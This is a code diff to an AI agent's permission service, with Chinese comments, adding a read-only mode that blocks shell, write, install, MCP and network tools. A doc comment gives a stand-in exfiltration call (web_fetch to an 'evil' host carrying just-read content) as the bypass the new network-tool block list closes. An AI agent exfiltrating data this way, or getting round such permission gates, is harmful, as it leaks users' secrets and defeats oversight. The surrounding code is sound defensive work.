@@ -19,7 +19,7 @@ import {
   protectedTargetsForMode,
   type PermissionMode,
 } from "./access-policy";
-import { bindExecutionOwner, createExecutionContext, type ExecutionContext } from "./execution-context";
+import { bindExecutionOwner, createExecutionContext, LEGACY_PERMISSION_MODE_ALIASES, type ExecutionContext } from "./execution-context";
 
 type PermissionBehavior = "allow" | "deny";
 type PermissionUpdateDestination = "userSettings" | "projectSettings" | "localSettings" | "session" | "cliArg";
@@ -87,7 +87,7 @@ export class AgentPermissionService {
         behavior: "deny",
         message: [
           `操作被阻止：${detail}`,
-          `模式：${mode === "full" ? "完全访问" : "标准"}`,
+          `模式：${permissionModeLabel(mode)}`,
           `操作：${operation}`,
           `目标：${target}`,
           `规则：${rule}`,
@@ -97,6 +97,15 @@ export class AgentPermissionService {
 
       const name = toolName.toLowerCase();
       const explicitPaths = extractExplicitPaths(input);
+
+      // 只读档：**读自由、其余一律拒绝**（2026-09-17 用户拍板）。
+      // 保证是**结构性**的——整个执行面被移除 ⇒ 没有进程能发起网络请求 ⇒ 读到敏感内容也送不出去；
+      // 正因如此这一档**放行**读凭据（与标准档相反）。但必须同时挡住联网工具与 MCP（见 readonlyDenyReason）。
+      if (mode === "readonly") {
+        const blocked = readonlyDenyReason(name);
+        if (blocked) return deny("readonly.blocked", blocked.operation, name, blocked.detail);
+        return allow();
+      }
 
       if (isReadTool(name)) {
         // 高敏凭据的**读**检查只在标准模式生效（2026-09-16 用户口径：完全访问除系统核心与
@@ -146,8 +155,9 @@ export class AgentPermissionService {
         if (unsafeScript) {
           return deny("core.privileged_operation", "execute", unsafeScript, "执行包含提权或系统控制命令的本地脚本（完全访问也不允许）");
         }
-        // 两种模式都不再有 OS 沙盒兜底（见 sandbox/manager.isSandboxEnabledForMode）→
-        // 这层执行前判定就是唯一屏障。三条线各接住沙盒原来扛的一件事：
+        // 标准 / 只读档的强制力来自**内核沙盒**（见 sandbox/manager.isSandboxEnabledForMode）；
+        // 下面三条线是**纵深**：给出更早、更可读的拒绝理由，并接住完全访问档（那里没有内核兜底）。
+        // 三条线各对应沙盒原来扛的一件事：
         // ① 保护面（原 denyWrite/allowWrite 的禁区）② 标准模式的区外写（原 allowWrite 的白名单）
         // ③ 标准模式的凭据读（原 denyRead）。都是启发式，边界见各函数注释。
         const protectedTarget = findProtectedWriteTarget(command, cwd, mode);
@@ -197,9 +207,15 @@ export const permissionService = new AgentPermissionService();
 
 function normalizeMode(raw: string): PermissionMode {
   if (raw === "full" || raw === "bypassPermissions") return "full";
-  // "sandbox" 是受限模式定名前用过的内部叫法，一并接受（老会话缓存里可能出现）
-  if (raw === "restricted" || raw === "sandbox") return "restricted";
-  return "standard";
+  // 旧值别名（"restricted"/"sandbox" 是只读档定名前用过的内部叫法）统一归一，见 execution-context。
+  return LEGACY_PERMISSION_MODE_ALIASES[raw] ?? (raw === "readonly" ? "readonly" : "standard");
+}
+
+/** 权限模式的中文名（拒绝消息里要显示人话）。 */
+export function permissionModeLabel(mode: PermissionMode): string {
+  if (mode === "full") return "完全访问";
+  if (mode === "readonly") return "只读";
+  return "标准";
 }
 
 function isReadTool(name: string): boolean {
@@ -212,6 +228,29 @@ function isWriteTool(name: string): boolean {
 
 function isShellTool(name: string): boolean {
   return name === "bash" || name === "powershell";
+}
+
+/**
+ * **联网类工具名**：它们不写文件、不跑 shell，但**能发请求 ⇒ 就是一条外泄出口**。
+ * 只读档必须挡掉它们，否则「读自由」会被 `web_fetch("https://evil/?x=" + 刚读到的内容)` 绕过，
+ * 整档的安全保证被抵消。（`mcp__*` 同理，另行拦。）
+ */
+const NETWORK_TOOL_NAMES = new Set(["web_fetch", "web_search", "webfetch", "websearch"]);
+
+/**
+ * 只读档下应当拒绝的工具。返回 `null` = 放行（读类工具与无副作用的杂项工具）。
+ *
+ * ⚠️ **不变量**：这里必须覆盖**所有**带执行面/写入面/联网面的工具。
+ * 新增此类工具时**必须同步登记**，否则会静默漏过——`__readonly.test.ts` 有清单守卫。
+ */
+export function readonlyDenyReason(toolName: string): { operation: string; detail: string } | null {
+  const name = toolName.toLowerCase();
+  if (isShellTool(name)) return { operation: "execute", detail: "只读档不执行任何命令（读自由，其余一律拒绝）" };
+  if (name === "install_dependency") return { operation: "execute", detail: "只读档不安装依赖（安装会执行包管理器的生命周期脚本）" };
+  if (isWriteTool(name)) return { operation: "write", detail: "只读档不写入文件" };
+  if (name.startsWith("mcp__")) return { operation: "execute", detail: "只读档不启用 MCP 工具（会启动进程或联网）" };
+  if (NETWORK_TOOL_NAMES.has(name)) return { operation: "network", detail: "只读档不联网（联网工具可以作为外泄出口）" };
+  return null;
 }
 
 function extractExplicitPaths(input: Record<string, unknown>): string[] {
